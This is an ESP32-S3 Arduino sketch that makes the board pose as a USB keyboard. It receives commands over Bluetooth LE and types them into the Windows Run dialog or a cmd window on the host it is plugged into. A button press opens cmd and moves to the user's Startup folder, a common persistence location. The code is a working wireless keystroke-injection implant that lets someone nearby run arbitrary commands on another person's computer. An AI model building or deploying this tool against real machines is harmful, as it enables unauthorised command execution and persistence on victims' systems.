//$ 9/JUNE/2023 11:32 PM

//% TODO: cade can loop a specific command action and can take it from BLE or
//% via wifi

// # last task done:
//` Code can execute command via CMD and run a program via BLE input

// #.....................................................
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>

//+ HID part ...................... :
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <esp_now.h>
String username = "hamid";
USBHIDKeyboard Keyboard;
const int buttonPin = 0; // GPIO0 is the default boot button pin
int previousButtonState = LOW;

//+ ................................

BLEServer *pServer = NULL;
BLECharacteristic *pCharacteristic = NULL;
bool deviceConnected = false;
bool oldDeviceConnected = false;
std::string receivedData = "";

class MyServerCallbacks : public BLEServerCallbacks {
  void onConnect(BLEServer *pServer) { deviceConnected = true; }

  void onDisconnect(BLEServer *pServer) { deviceConnected = false; }
};

void inputManager(String input);
class MyCharacteristicCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *pCharacteristic) {
    std::string value = pCharacteristic->getValue();
    if (value.length() > 0) {
      receivedData = value;
      Serial.print("Received from BLE: ");
      Serial.println(receivedData.c_str());
      inputManager(String(receivedData.c_str()));

      // Print the received data back to the BLE connection
      pCharacteristic->setValue("BLE: " + receivedData);
      pCharacteristic->notify();
    }
  }
};
void setup() {
  Serial.begin(115200);

  //+.................................
  pinMode(buttonPin, INPUT_PULLDOWN);
  Keyboard.begin();
  USB.begin();
  //+.................................

  BLEDevice::init("ESP32-S3 BLE");
  pServer = BLEDevice::createServer();
  pServer->setCallbacks(new MyServerCallbacks());

  BLEService *pService = pServer->createService(
      BLEUUID("4fafc201-1fb5-459e-8fcc-c5c9c331914b")); // Custom service UUID
  pCharacteristic = pService->createCharacteristic(
      BLEUUID(
          "beb5483e-36e1-4688-b7f5-ea07361b26a8"), // Custom characteristic UUID
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE);
  pCharacteristic->setCallbacks(new MyCharacteristicCallbacks());

  pService->start();

  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->addServiceUUID(pService->getUUID());
  pAdvertising->setScanResponse(true);
  pAdvertising->setMinPreferred(0x06); // sets the minimum advertising interval
  BLEDevice::startAdvertising();

  Serial.println("Waiting for Bluetooth connection...");
}

void loop() {
  //+.................................
  int buttonState = digitalRead(buttonPin);

  if (buttonState == HIGH && previousButtonState == LOW) {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("cmd");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print(
        "cd %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start "
        "Menu\\Programs\\Startup");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(2000);
  }
  if (buttonState == LOW && previousButtonState == HIGH) {
    Keyboard.release(97);
    delay(50);
  }
  previousButtonState = buttonState;
  //+.................................
  if (deviceConnected) {
    if (!oldDeviceConnected) {
      Serial.println("Connected to device");
      oldDeviceConnected = true;
    }
  } else {
    if (oldDeviceConnected) {
      Serial.println("Disconnected from device");
      oldDeviceConnected = false;
    }
  }

  delay(100);
}
void inputManager(String input) {
  if (input == "test") {
    Serial.println("defined word: test");
  } else if (input.startsWith("#run_")) {
    String command = input.substring(5);
    runCommand(command);
  } else if (input.startsWith("#cmd_")) {
    String command = input.substring(5);
    cmdCommand(command);
  } else {
    Serial.println("undefined command : " + input);
  }
}
void runCommand(String command) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
  Keyboard.print(command);
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(300);

  //   Keyboard.press(KEY_LEFT_ARROW);
  //   delay(300);
  //   Keyboard.release(KEY_LEFT_ARROW);
  //   delay(300);

  //   Keyboard.press(KEY_RETURN);
  //   delay(100);
  //   Keyboard.release(KEY_RETURN);
}
void cmdCommand(String command) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
  Keyboard.print("cmd");
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.print(command);
  delay(300);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
